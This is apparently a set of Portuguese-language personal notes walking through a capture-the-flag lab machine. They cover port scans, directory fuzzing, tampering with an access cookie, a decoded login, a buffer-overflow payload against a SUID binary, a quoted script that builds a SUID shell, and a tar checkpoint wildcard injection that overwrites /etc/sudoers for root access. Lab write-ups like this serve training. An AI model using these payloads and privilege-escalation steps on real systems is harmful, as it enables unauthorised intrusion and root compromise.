@@ -1,0 +1,247 @@
+RESLTADO RUSTSCAN:
+
+Open 10.64.169.175:22
+Open 10.64.169.175:80
+
+
+RESULTADO NMAP:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e1:f1:96:8a:01:b3:48:2f:5a:f8:a6:e2:d6:92:36:2d (RSA)
+|   256 aa:53:d9:ff:62:d5:ec:08:aa:92:0f:fd:7f:eb:83:10 (ECDSA)
+|_  256 d4:18:6f:e7:c1:99:d2:5a:9e:26:c5:3b:6b:05:5d:02 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/zYdHuAKjP
+|_http-title: Proving Grounds
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+MÁQUINA: linux
+
+-->  http-robots.txt: 1 disallowed entry
+
+FUZZING DE DIRETÓRIOS:
+
+ffuf -u http://10.64.169.175/FUZZ -H "Host: 10.64.169.175" -w ~/Downloads/Wordlists/admin.txt -i -ic -mc 200,301,302 -c
+
+/robots.txt
+	|_> dentro de robots.txt tem esse diretório: /zYdHuAKjP
+
+EXPLORANDO O DIRETÓRIO ENCONTRADO:
+
+/zYdHuAKjP
+
+Mensagem ao abrir o diretório:
+
+"You have not been granted access.
+Access denied."
+
+Analisando a página:
+
+--> Página sem javascript e sem comentários no códigos:
+
+Analisando a requisição com o Burp:
+
+GET /zYdHuAKjP/ HTTP/1.1
+Host: 10.64.169.175
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: access=denied
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+INTERESSANTE O COOKIE PASSADO COMO "denied"!
+
+Mudei o cookie para granted e consegui essa criptografia:
+
+hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
+
+está no formato de USERNAME:PASSWORD
+
+utilizando um decodificador:
+
+RESULTADO: magna:magnaisanelephant
+
+
+
+PÁGINA "operatives.php" RETORNA ALGUNS NOMES:
+
+themayor
+spooky
+darkstar
+akaelite
+ninja
+w0rmer
+nameless0ne
+0day
+szymex
+ma1ware
+paradox
+bee
+iamwill
+jammy
+magna 	--> ACHEI A SENHA DESSE CARINHA AQUI
+cryillic
+skidy
+naughty
+thealchemist
+itsundae
+
+FLAG 1 ENCONTRADA AO LOGAR COMO magna
+
+--> LISTANDO AQUIVOS DO DIRETÓRIO MAGNA:
+
+drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .
+drwxr-xr-x 6 root   root   4096 Mar 11 16:49 ..
+lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 magna  magna   220 Jul  4  2020 .bash_logout
+-rw-r--r-- 1 magna  magna  3771 Jul  4  2020 .bashrc
+drwx------ 2 magna  magna  4096 Jul  4  2020 .cache
+drwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config
+drwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg
+drwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .local
+-rw-r--r-- 1 magna  magna   807 Jul  4  2020 .profile
+drwx------ 2 magna  magna  4096 Jul  4  2020 .ssh
+-rw------- 1 magna  magna   817 Jul  7  2020 .viminfo
+-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt
+-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld
+-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
+
+
+--> conteúdo do arquivo: note_from_spooky.txt
+
+Hey Magna,
+
+Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
+Engineering and Malware Development.  I think this is a really good start.  See if you can break it!
+
+P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!
+
+Best,
+Spooky
+
+
+listando o diretório do usuário spooky:
+
+magna@ip-10-64-169-175:/home/spooky$ ls -la
+total 36
+drwxr-xr-x 4 spooky spooky 4096 Jul 10  2020 .
+drwxr-xr-x 6 root   root   4096 Mar 11 16:49 ..
+lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 spooky spooky  220 Jul  4  2020 .bash_logout
+-rw-r--r-- 1 spooky spooky 3771 Jul  4  2020 .bashrc
+-rwxrwxrwx 1 spooky magna     0 Jul 10  2020 .confrc
+drwxrwxr-x 3 spooky spooky 4096 Jul  5  2020 .local
+-rw-r--r-- 1 spooky spooky  807 Jul  4  2020 .profile
+drwx------ 2 spooky spooky 4096 Jul  8  2020 .ssh
+-rw-rw-r-- 1 spooky magna   535 Jul 10  2020 .webscript
+-r-------- 1 spooky spooky   33 Jul  4  2020 flag.txt
+magna@ip-10-64-169-175:/home/spooky$ strings .confrc 
+
+--> .confrc --> arquivo vazio
+--> .webscript --> arquivo interessante:
+
+strings .webscript
+
+#!/bin/sh
+# get current user uid / gid
+CURR_UID="$(id -u)"
+CURR_GID="$(id -g)"
+# save file
+cat > .cachefile.c << EOF
+#include <stdio.h>
+int main()
+setuid($CURR_UID);
+setgid($CURR_GID);
+execl("/bin/bash", "-bash", NULL);	RODANDO SHELL
+return 0;
+# make folder where the payload will be saved
+mkdir .cache
+chmod 755 .cache
+# compile & give SUID
+gcc -w .cachefile.c -o .cache/.cachefile
+chmod 4755 .cache/.cachefile
+# clean up
+rm -rf ./'--checkpoint=1'
+rm -rf ./'--checkpoint-action=exec=sh .webscript'
+rm -rf .webscript
+rm -rf .cachefile.c
+
+
+--> Esse binário parece ser uma escalação de privilégio via SUID BIT
+--> Linha suspeita: execl("/bin/bash", "-bash", NULL);
+	|_> Ao rodar ele ganha uma shell como o usuário spooky
+	
+	
+---- ATÉ AQUI NÃO FUNCIONOU ----
+
+---- NOVA TENTATIVA DEBUGANDO O BINÁRIO ----
+
+--> r2 hacktheworld 
+
+[0x00400570]> aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for objc references
+[x] Check for vtables
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Finding function preludes
+[x] Enable constraint types analysis for variables
+[0x00400570]> afll
+
+address            size  nbbs edges    cc cost          min bound range max bound          calls locals args xref frame name
+================== ==== ===== ===== ===== ==== ================== ===== ================== ===== ====== ==== ==== ===== ====
+0x0000000000400570   42     1     0     1   14 0x0000000000400570    42 0x000000000040059a     1    0      1    0     8 entry0
+0x00000000004005b0   37     4     4     4   18 0x00000000004005b0    42 0x00000000004005da     0    0      0    1     8 sym.deregister_tm_clones
+0x00000000004005e0   55     4     4     4   23 0x00000000004005e0    58 0x000000000040061a     0    0      0    1     8 sym.register_tm_clones
+0x0000000000400620   29     3     2     3   16 0x0000000000400620    34 0x0000000000400642     1    0      0    0     8 entry.fini0
+0x0000000000400650    7     1     1     0    5 0x0000000000400650     7 0x0000000000400657     0    0      0    0     8 entry.init0
+0x0000000000400780    2     1     0     1    3 0x0000000000400780     2 0x0000000000400782     0    0      0    1     0 sym.__libc_csu_fini
+0x0000000000400784    9     1     0     1    5 0x0000000000400784     9 0x000000000040078d     0    0      0    0     8 sym._fini
+0x0000000000400657  129     1     0     1   51 0x0000000000400657   129 0x00000000004006d8    11    0      0    0     8 sym.call_bash
+0x0000000000400510    6     1     0     1    3 0x0000000000400510     6 0x0000000000400516     0    0      0    5     0 sym.imp.puts
+0x0000000000400560    6     1     0     1    3 0x0000000000400560     6 0x0000000000400566     0    0      0    4     0 sym.imp.sleep
+0x0000000000400550    6     1     0     1    3 0x0000000000400550     6 0x0000000000400556     0    0      0    1     0 sym.imp.setuid
+0x0000000000400520    6     1     0     1    3 0x0000000000400520     6 0x0000000000400526     0    0      0    1     0 sym.imp.system
+0x0000000000400710  101     4     5     3   43 0x0000000000400710   101 0x0000000000400775     1    0      3    1    56 sym.__libc_csu_init
+0x00000000004005a0    2     1     0     1    3 0x00000000004005a0     2 0x00000000004005a2     0    0      0    0     0 sym._dl_relocate_static_pie
+0x00000000004006d8   56     1     0     1   21 0x00000000004006d8    56 0x0000000000400710     2    3      2    1    88 main
+0x0000000000400530    6     1     0     1    3 0x0000000000400530     6 0x0000000000400536     0    0      0    1     0 sym.imp.printf
+0x0000000000400540    6     1     0     1    3 0x0000000000400540     6 0x0000000000400546     0    0      0    1     0 sym.imp.gets
+0x00000000004004e0   23     3     3     2   12 0x00000000004004e0    23 0x00000000004004f7     0    0      0    1     8 sym._init
+
+
+--> 0x0000000000400657  129     1     0     1   51 0x0000000000400657   129 0x00000000004006d8    11    0      0    0     8 sym.call_bash
+
+|_> sym.call_bash -> Realiza uma chamada de bash
+|_> sym_.imp.gets -> Função extremamente insegura pois não limita o tamanho do input! 
+
+VULNERABILIDADE AQUI É BUFFER OVERFLOW!
+
+--> payload: python -c 'print "D"*72 + "\x58\x06\x40\x00\x00\x00"' | ./hacktheworld
+--> depois de executar, ganhei shell como spooky
+
+FLAG 2 DENTRO DA HOME DO spooky
+
+VIRANDO ROOT:
+
+echo 'echo "spooky ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
+echo "" > "--checkpoint-action=exec=sh demo.sh"
+echo "" > --checkpoint=1
+chmod 777 demo.sh
+sudo bash
+acesso root!
+
+
+
